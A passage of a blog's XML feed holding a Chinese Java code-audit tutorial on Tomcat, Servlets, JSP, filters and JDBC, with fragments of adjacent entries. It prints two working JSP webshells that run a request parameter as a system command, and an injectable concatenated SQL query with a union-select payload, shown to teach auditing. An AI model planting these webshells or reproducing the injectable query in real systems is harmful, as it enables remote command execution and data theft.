      <category>靶场笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
      <tag>nmap</tag>
      
      <tag>ftp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计 Java Web基础</title>
    <link href="/2023/09/18/blog0031-2-Java%20Web%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/09/18/blog0031-2-Java%20Web%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>在上一章节，我们学习了Java SE的一些基础。</p><p>接下来就正式进入了Java Web的学习，我们会从Java Web的架构讲起，并重点介绍servlet、tomcat和JSP技术。</p><p>为了方便我们后面的框架讲解，我们在这里引入jdbc的基本说明。</p><span id="more"></span><h2 id="java-web-架构">1、Java Web 架构</h2><p>首先，我们明确Web应用的基本架构，也为了方便我们后续更好地理解Java Web。</p><p><strong>浏览器</strong>：渲染前端页面，可以执行服务端下发的javascript脚本</p><p><strong>服务器软件</strong>：也可以叫Web应用容器/服务器软件，常见的Tomcat、Weblogic等。当然，我们也可以将nginx的反向代理功能和tomcat结合作为一个整体的Web应用服务器。</p><p>Web应用服务器的作用主要在<strong>用户和后端程序间做数据处理</strong>，起到一个桥梁作用，同时也用于管理后端应用程序进程。（我们在配置php的时候，apache + php_fpm模块组成的Web应用服务器往往都是自带的，因此不需要额外配置。）</p><p><strong>Web后端程序</strong>：这里就是我们写的Java代码了。比如Servlet类，用来处理用户的请求以及响应。</p><h2 id="java-web交互">2、Java Web交互</h2><p>在Sun的Java Servlet规范中，对Java Web应用作了这样定义：“JavaWeb应用由一组Servlet、HTML页、类、以及其它可以被绑定的资源构成。它可以在各种供应商提供的实现Servlet规范的 <strong>Servlet容器</strong> 中运行。”</p><p>下图是基本的Java Web响应流程。需要注意的是，JSP在运行时也会被编译为<code>Servlet</code>类。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0032/image-20211128141044514.png" alt="img" /></p><p>我们常见的Servlet容器有：Tomcat、Weblogic等等。</p><h2 id="tomcat">3、Tomcat</h2><p>Tomcat是一款开源的Servlet容器，在实际开发中的使用非常广泛。</p><p>对于Tomcat的目录结构，我们有如下的说明</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">bin : 存放启动和关闭<span class="hljs-type">Tomcat</span>的脚本文件<br>conf: <span class="hljs-type">Tomcat</span>各种配置文件的存放文职<br>lib: 存放<span class="hljs-type">Tomcat</span>服务器和所有Web应用程序需要访问的jar文件<br>logs: 存放<span class="hljs-type">Tomcat</span>的日志文件<br>temp: 存放<span class="hljs-type">Tomcat</span>运行时生成的临时文件<br>webapps: 存放<span class="hljs-type">Tomcat</span>的Web应用程序<br>work: <span class="hljs-type">Tomcat</span>将JSP生成的Servlet源文件及字节码存放在这个目录下。<br></code></pre></td></tr></table></figure><p>Tomcat的最常见的一个配置就是设置服务器软件监听的端口的配置，基础情况下也只需要关注这个配置即可。</p><p>在<code>conf/server.xml</code>找到<code>Connector</code>配置即可完成相应的配置，修改对应的port即可。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231006215631395.png" alt="image-20231006215631395" /></p><h2 id="servlet技术">4、Servlet技术</h2><h3 id="创建程序">4.1、创建程序</h3><p>具体细节参照<a href="https://whistleh.github.io/2023/09/03/blog0031-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89-IDEA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#%E4%B8%89java-web%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA">Java Web项目创建</a></p><h3 id="目录结构">4.2、目录结构</h3><p>学习代码审计，首先要了解的就是Web应用程序的目录结构。对于Java Web，它的Web目录结构相对来说比较陌生，尤其是比起常见的文件路由形式。</p><p>对于4.1我们创建的Java Web而言，它的目录结构是这样的。</p><p>熟悉目录架构对于目录遍历漏洞非常有效，通过目录遍历我们可以拿到web.xml和相应的class文件，从而获取到Java Web的源码。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231023171340192.png" alt="image-20231023171340192" /></p><h3 id="路由配置">4.3、路由配置</h3><p>Servlet + JSP技术的路由配置其实有两种方式。</p><h4 id="jsp文件路由">JSP文件路由</h4><p>对于JSP文件，我们仍然可以通过文件路由的形式实现对它的访问。</p><p>我们在index.jsp<strong>同目录</strong>下写入shell.jsp，看看是否能实现对它的利用，测试发现能够顺利连接。</p><p>对于JSP文件，Java Web 仍然采用文件路由的形式来进行管理，这也是Java Webshell的实现方式之一。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231023172921669.png" alt="image-20231023172921669" /></p><h4 id="路由注解">路由注解</h4><p>在高版本的Servlet，已经支持在Servlet类加入路由注解，从而实现路由与Servlet的绑定。</p><p>可以看到如下的@WebServlet注解绑定了<code>/hello-servlet</code>路由。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>        message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br><br>        <span class="hljs-comment">// Hello</span><br>        PrintWriter out = response.getWriter();<br>        out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="web.xml配置">web.xml配置</h4><p>在低版本的Servlet，必须在web.xml中写相应的配置才可以绑定路由。</p><p>我们以刚刚helloServlet为例来进行说明。</p><p>在web.xml中加入如下语句（记得注释掉原来的WebServlet注解）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>helloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.javaservletbeginner.HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>helloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/hello<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>实现了 Class -&gt; Servlet -&gt; Router 的三步绑定，创建了新的路由。</p><h3 id="httpservletrequest">4.4、HttpServletRequest</h3><p>Servlet API 中定义的 ServletRequest 接口类用于封装请求消息。</p><p>HttpServletRequest 是专用于HTTP协议的ServletRequest 子接口，它用于封装 HTTP 请求消息。</p><p>HTTPServletRequest类内部实现了许多关于HTTP请求处理的方法，例如：doGet、doPost、getParameter等方法，感兴趣的读者可以直接查看Java源码中关于这一部分的说明。</p><p>需要特别注意的是请求域属性这一概念。</p><p><strong>请求域属性</strong></p><p>存储在ServletRequest对象中的对象称之为请求域属性，属于同一个请求的多个处理模块之间可以通过请求域属性来传递对象数据。</p><p>与请求域属性相关的方法：</p><ol type="1"><li><strong>setAttribute</strong>方法</li><li>getAttribute方法</li><li><strong>removeAttribute</strong>方法</li><li>getAttributeNames方法</li></ol><p>常见的利用模式如下 ：浏览器发起请求 -&gt; Servlet处理请求 -&gt; JSP共享Servlet域属性 -&gt; 渲染JSP页面。</p><h3 id="httpservletresponse">4.5、HTTPServletResponse</h3><p>Servlet API中定义的ServletResponse接口类用于创建响应消息。</p><p>HttpServletResponse是专用于HTTP协议的ServletResponse子接口，它用于封装HTTP响应消息。</p><h3 id="重定向与转发">4.6、重定向与转发</h3><p>RequestDispatcher接口</p><ul><li>RequestDispatcher实例对象是由Servlet引擎创建的，它用于包装一个要被其他资源调用的资源（例如，Servlet、HTML文件、JSP文件等），并可以通过其中的方法将客户端的请求转发给所包装的资源。</li><li>RequestDispatcher接口中定义了两个方法：forward方法和include方法。</li><li>forward和include方法接收的两个参数必须是传递给当前Servlet的service方法的那两个ServletRequest和ServletResponse对象，或者是对它们进行了包装的ServletRequestWrapper 或ServletResponseWrapper对象。</li><li>获取RequestDispatcher对象的方法：<br />ServletContext.getRequestDispatcher （参数只能是以“/”开头的路径）<br />ServletContext.getNamedDispatcher<br />ServletRequest.getRequestDispatcher （参数可以是不以“/”开头的路径）</li></ul><h2 id="jsp技术">5、JSP技术</h2><p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p><p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p><p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p><p>在此强烈推荐JSP教程来完成基础的JSP学习</p><p><a href="https://doc.yonyoucloud.com/doc/wiki/project/jsp/overview.html">JSP教程</a></p><h3 id="jsp请求">5.1、JSP请求</h3><p>一般来说，你请求一个JSP资源会经历如下过程</p><ul><li>作为正常的页面，你的浏览器发送一个 HTTP 请求到 web 服务器。</li><li>web 服务器承认一个 JSP 页面的 HTTP 请求，并将其转发给一个 JSP 引擎。这是通过使用 URL 或 JSP 页面实现的，该 JSP 页面是以<strong>.jsp</strong>结尾而不是以 .html 结尾的。</li><li>JSP 引擎从磁盘加载 JSP 页面并将其转换为一个 servlet 的内容。这种转换是非常简单的，所有模板文本转换为 println()语句，所有 JSP 元素转换为 Java 代码实现页面的相应的动态行为。</li><li>JSP 引擎编译 servlet 到一个可执行的类中，并将原始请求转发给一个 servlet 引擎。</li><li>调用 servlet 引擎的 web 服务器的一部分加载 Servlet 类并执行它。执行期间，Servlet 产生一个 HTML 格式的输出，servlet 引擎将该输出传递到 HTTP 响应内的 web 服务器中。</li><li>web 服务器将 HTTP 响应以静态 HTML 内容的形式转发到你的浏览器中。</li><li>最后 web 浏览器处理 HTTP 响应中的动态生成的 HTML 页面，就好像它是一个静态页面。</li></ul><h3 id="jsp语法">5.2、JSP语法</h3><p>JSP的基础语法相对比较繁琐，参照上述博客即可学习JSP的基础语法。</p><h3 id="jsp-webshell">5.3、JSP Webshell</h3><p>学习了基础的JSP语法，我们可以来尝试一下JSP的一句话木马</p><p>不过这样的Webshell是没有回显，但是可以尝试反弹shell。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)); %&gt;<br></code></pre></td></tr></table></figure><p>当然也可以尝试使用输入输出流打印webshell的输出，这样就能成功使用回显打印相应的内容。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) !=  <span class="hljs-keyword">null</span>)<br>    &#123;<br>        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>        BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(in));<br><br>        PrintWriter pw = response.getWriter();<br>        String lines;<br><br>        pw.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((lines = br.readLine()) != <span class="hljs-keyword">null</span>)<br>        &#123;<br>            pw.println(lines);<br>        &#125;<br>        pw.write(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="filter过滤器">6、Filter过滤器</h2><p>Filter 的基本功能是对 Servlet 容器调用 Servlet 的过程进行拦截，从而在 Servlet 进行响应处理的前后实现一些特殊的功能。</p><p>我们在设计Java Web的过程中，有的时候需要对多个Servlet做横向的拦截管理，这时候Filter类就能够起到作用。</p><ul><li>在 Servlet API 中定义了三个接口类来开供开发人员编写 Filter 程序：Filter, FilterChain, FilterConfig</li><li>Filter 程序是一个实现了 Filter 接口的 Java 类，与 Servlet 程序相似，它由 Servlet 容器进行调用和执行</li><li>Filter 程序需要在 web.xml 文件中进行注册和设置它所能拦截的资源：Filter 程序可以拦截 Jsp, Servlet, 不拦截静态图片文件和静态 html 文件</li></ul><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20211128212735228.png" alt="img" /></p><p>这里我们实现一个简单的Filter类，配置方式和其他类一样，都可以写web.xml和路由注解方式。</p><p>这个类实现的就是，对于除了login之外的路由，全部重定向到hello路由。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.javaservletbeginner;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebFilter(filterName = &quot;TestFilter&quot;,urlPatterns = &quot;/*&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        HttpServletRequest req = (HttpServletRequest) request;<br>        HttpServletResponse resp = (HttpServletResponse) response;<br><br>        String requestUri = req.getRequestURI();<br>        System.out.println(requestUri);<br>        <span class="hljs-comment">// 获取路由</span><br>        <span class="hljs-keyword">if</span>(requestUri.contains(<span class="hljs-string">&quot;/login&quot;</span>))<br>        &#123;<br>            chain.doFilter(req, resp);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            request.getRequestDispatcher(<span class="hljs-string">&quot;/hello&quot;</span>).forward(req, resp);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到访问路由abcd返回到hello界面</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20240117232751813.png" alt="image-20240117232751813" /></p><p>访问login路由返回到正常的页面</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20240117233002748.png" alt="image-20240117233002748" /></p><h2 id="mvc架构">7、MVC架构</h2><p>MVC架构是Web中的常见架构，即Model-View-Controller</p><ul><li>模型是应用程序的主体部分，模型表示业务数据和业务逻辑。一个模型能为多个视图提供数据，由于应用于模型的代码只需写一次就可以被多个视图重用，所以提高了代码的可重用性。</li><li><strong>视图</strong>是用户看到并与之交互的<strong>界面</strong>，视图向用户显示相关的数据、接受用户的输入、<strong>不进行任何实际的业务处理</strong>。</li><li>控制器接受用户的输入并调用模型和视图去完成用户的需求。控制器接收请求并决定调用哪个模型组件去处理请求，然后决定调用哪个视图来显示模型处理返回的数据</li></ul><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20211128212618863.png" alt="img" /></p><h2 id="jdbc使用">8、JDBC使用</h2><p>JDBC是Java原生和数据库进行交互的方式。JDBC实现数据库的操作基本是如下几个步骤：</p><ol type="1"><li>注册驱动</li><li>建立数据库连接</li><li>创建待执行的SQL对象</li><li>运行SQL对象</li><li>获取处理结果</li><li>释放资源</li></ol><h3 id="jdbc连接">8.1、JDBC连接</h3><p>常见的数据库连接类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Conn</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String driver;<span class="hljs-comment">//连接数据库的驱动</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String url;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String password;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        driver = <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>;<span class="hljs-comment">//需要的数据库驱动</span><br>        url = <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/demo&quot;</span>;<span class="hljs-comment">//数据库名路径</span><br>        username = <span class="hljs-string">&quot;root&quot;</span>;<br>        password = <span class="hljs-string">&quot;root&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title">open</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(driver);<span class="hljs-comment">//加载驱动</span><br>            <span class="hljs-keyword">return</span> (Connection) DriverManager.getConnection(url, username, password);<span class="hljs-comment">//创建链接</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;数据库连接失败！&quot;</span>);<br>            e.printStackTrace();<br>        &#125;<span class="hljs-comment">//加载驱动</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 关闭数据库</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">(Connection conn)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (conn != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                conn.close();<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>对于数据库操作，我们需要引入<code>Statement</code>， 执行对象。目前常用的执行对象接口有三种： <strong>Statement、PreparedStatement</strong>和CallableStatement</p><h3 id="statement">8.2、Statement</h3><ul><li>Statement 主要用于执行静态SQL语句。</li><li>Statement 每执行一次都要对传入的SQL语句编译一次，效率较低 。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">search1</span><span class="hljs-params">(Connection conn)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 读取命令行输入</span><br>    System.out.println(<span class="hljs-string">&quot;Please input the id : &quot;</span>);<br>    Scanner sc = <span class="hljs-keyword">new</span> Scanner(System.in);<br>    String id = sc.nextLine();<br>    <span class="hljs-keyword">try</span>&#123;<br>        String sql = <span class="hljs-string">&quot;select * from users where id = &quot;</span> + id;<br>        ResultSet rs = <span class="hljs-keyword">null</span>;<br>        Statement st = conn.createStatement();<br>        rs = st.executeQuery(sql);<br>        <span class="hljs-keyword">while</span>(rs.next())<br>        &#123;<br>            System.out.println(<span class="hljs-string">&quot;id : &quot;</span> + rs.getInt(<span class="hljs-string">&quot;id&quot;</span>) +<br>                            <span class="hljs-string">&quot;\tname : &quot;</span> + rs.getString(<span class="hljs-string">&quot;username&quot;</span>));<br>        &#125;<br>    &#125;<span class="hljs-keyword">catch</span> (SQLException e)<br>    &#123;<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到我们如果尝试写入id的值为，就能够成功实现注入</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>, <span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span> <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="preparedstatement">8.3、PreparedStatement</h3><p>预编译，指的是在SQL语句中使用占位符从而避免传入参数被执行。通过占位符传递的字符串，将不会被识别为SQL的<code>关键字</code>。</p><p>同时这也就引入了面试的一个高频面试考点，预编译无法在order by之后使用，因为order by其后跟着的是SQL的列名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">search2</span><span class="hljs-params">(Connection conn)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 读取命令行输入</span><br>    System.out.println(<span class="hljs-string">&quot;Please input the id : &quot;</span>);<br>    Scanner sc = <span class="hljs-keyword">new</span> Scanner(System.in);<br>    String id = sc.nextLine();<br>    <span class="hljs-keyword">try</span>&#123;<br>        String sql = <span class="hljs-string">&quot;select * from users where id = ?&quot;</span>;<br>        PreparedStatement pstmt = (PreparedStatement)conn.prepareStatement(sql);<br>        pstmt.setString(<span class="hljs-number">1</span>, id);<br><br>        ResultSet rs = <span class="hljs-keyword">null</span>;<br>        rs = pstmt.executeQuery();<br>        <span class="hljs-keyword">while</span>(rs.next())<br>        &#123;<br>            System.out.println(<span class="hljs-string">&quot;id : &quot;</span> + rs.getInt(<span class="hljs-string">&quot;id&quot;</span>) +<br>                    <span class="hljs-string">&quot;\tname : &quot;</span> + rs.getString(<span class="hljs-string">&quot;username&quot;</span>));<br>        &#125;<br>    &#125;<span class="hljs-keyword">catch</span> (SQLException e)<br>    &#123;<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="callablestatement">8.4、CallableStatement</h3><p>CallableStatement接口提供了执行存储过程的方法。</p><p>存储过程导致漏洞的原因，其实也是因为参数传入导致字符串拼接，这个跟Java本身的接口实现并没有非常深入的关系。</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>Code Audit</tag>
      
      <tag>notes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali2021 docker安装配置</title>
    <link href="/2023/09/06/blog0035-kali2021-docker%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
    <url>/2023/09/06/blog0035-kali2021-docker%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    
